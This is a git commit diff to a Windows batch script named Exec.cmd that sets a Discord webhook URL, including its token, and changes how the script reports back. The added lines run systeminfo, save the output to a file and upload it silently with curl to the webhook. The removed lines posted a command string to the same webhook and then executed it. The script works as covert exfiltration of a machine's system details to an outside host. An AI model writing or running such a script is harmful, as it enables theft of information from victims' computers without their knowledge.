8f82a22e300705cf921d0aed99667216ed9a838d
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-16 21:49:46 +0300

    Update Exec.cmd

--- Exec.cmd
+++ Exec.cmd
@@ -6,7 +6,6 @@ cd %temp%
 set webhook=https://discordapp.com/api/webhooks/1029420421134680064/O3e1_ivqQexrC5xDMF-5ne9hsrcZhyw561covq0STMU2hprO2ONNy5Ur03RSPSb5k_5h
 
 :Commands
-for /f %%a in ('powershell Invoke-RestMethod "systeminfo"') do set cmd=%%a
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%cmd%\"}" %webhook%
-%cmd%
+systeminfo > output.txt
+curl --silent --output /dev/null -F save.dat=@"output.txt" %webhook%
 pause
